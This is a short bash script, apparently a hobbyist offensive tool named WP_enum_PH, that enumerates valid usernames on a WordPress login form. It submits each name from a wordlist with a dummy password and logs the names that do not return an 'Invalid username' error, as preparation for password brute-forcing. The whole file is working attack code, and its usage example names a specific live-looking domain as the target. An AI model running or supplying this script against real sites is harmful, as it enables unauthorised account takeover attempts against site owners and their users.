# !/bin/bash/

echo "[+] Welcome to WP_enum_PH"
exit_arg() {
 echo "[!] Arguments misconfigured. Use --help for guidance"
}

if [ "$1" != "" ]; then
	if [ "$1" == "--help" ]; then
	  echo "[+] Help"
	  echo " WP_enum.sh --url <> -w <>"
	  echo "--url		-target URL Login Form"
	  echo -e " -w		-word list Bruteforce\n"
          echo -e "Example: \n ./WP_enum.sh --url tanjojo.com/wp-login.php -w /root/wordlist.txt"
	elif [ "$1" == "--url" ] && [ "$3" == "-w" ]; then
	  echo "[+] Proceeding"
	  url="$2"
	  file="$4"
	  echo $url, $4
	else
	  exit_arg	
	fi
else	
  exit_arg
fi


exit_tool() {
 exit 0
}

check_url() {
u_status=$(curl -Is $url | head -n 1)
if [[ "$u_status" =~ "200 OK" ]]; then
  echo "[+] URL is up"
else
 echo "[-] Please check the URL"
 exit_tool
fi
}

#main here
check_url
domain=$(echo ${url///})
echo "[+] Domain: "$domain
#temp_mac=$(echo ${target_mac//:}) 
#reference #interface_search=$(ip link | awk -F: '$0 "lo|eth|vir|wl|^[^0-9]" {print $2;getline}')
curl -D cookie1.txt $url >nul #store cookie 
echo "[+] Cookie store success"

while read string
do
  c_result=$(curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0" -D cookie2.txt -b cookie1.txt -F log=$string -F pwd=password -F testcookie=1 -F wp-submit="Log In" -F redirect_to=$url/wp-admin -F submit=login -F rememberme=forever $url 2<&1 | grep ERROR)
  if [[ "$c_result" == "" ]]; then
	echo "[!] Error Occured!"
	exit_tool
  elif [[ "$c_result" =~ "Invalid username" ]]; then
	echo "[-] Invalid Username: "$string
  else
	echo "[+] Possible Username!: "$string
	echo $string >> "$domain".txt
  fi
done < $file





exit_tool

